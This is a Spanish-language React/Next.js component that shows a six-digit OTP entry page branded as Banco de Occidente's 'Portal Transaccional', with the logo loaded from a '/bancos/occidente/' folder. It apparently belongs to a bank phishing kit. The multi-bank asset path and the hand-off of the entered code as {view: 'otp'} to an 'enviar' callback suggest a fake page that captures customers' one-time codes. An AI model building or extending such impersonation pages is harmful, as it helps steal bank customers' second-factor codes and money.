/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useRef, useState } from "react";

export default function Otp({
  enviar,
}: {
  enviar?: (code: any) => void;
}) {
  const [values, setValues] = useState(["", "", "", "", "", ""]);
  const inputsRef = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    if (!/^[0-9]?$/.test(value)) return; // solo número

    const newValues = [...values];
    newValues[index] = value;
    setValues(newValues);

    if (value !== "" && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && values[index] === "" && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const isComplete = values.every((v) => v !== "");

  const handleSubmit = () => {
    if (!isComplete) return;
    const code = values.join("");

    enviar?.({
      view: 'otp',
      otp: code,
    });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col justify-start px-6 py-10">
      <img
        src="/bancos/occidente/logo-occi.svg"
        width={180}
        height={40}
        alt="Logo Banco"
        className="mx-auto mb-6 w-[180px] h-auto"
      />

      {/* TEXTO BIENVENIDA */}
      <p className="text-center mb-6 text-gray-600">
        ¡Bienvenido! a tu,
        <br />
        <a href="#" className="text-[#2C7BFF]">
          Portal Transaccional
        </a>
      </p>
      {/* Título */}
      <h1 className="text-4xl font-bold text-center mb-8 text-gray-600">Ingresa tu código</h1>

      {/* Subtitulo */}
      <p className="text-gray-600 text-center mb-8">Codígo OTP de 6 dígitos</p>

      {/* Caja OTP */}
      <div className="flex justify-center gap-4 mb-10">
        {values.map((val, index) => (
          <input
            key={index}
            ref={(el: HTMLInputElement | null) => {
              inputsRef.current[index] = el;
            }}
            type="password"
            inputMode="numeric"
            maxLength={1}
            className="w-12 h-12 rounded-lg border text-[#2C7BFF] border-gray-800 text-center text-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-300"
            value={val}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
          />
        ))}
      </div>

      {/* Link */}
      <div className="text-right text-[#0081ff] pr-2 mb-10 cursor-pointer">
        ¿No recibiste el código?
      </div>

      {/* Botón */}
      <button
        disabled={!isComplete}
        onClick={handleSubmit}
        className={`w-full py-4 rounded-2xl font-bold text-lg transition-all ${isComplete
          ? "bg-blue-600 text-white cursor-pointer"
          : "bg-gray-400 text-gray-700 cursor-not-allowed"
          }`}
      >
        Validar código
      </button>
    </div>
  );
}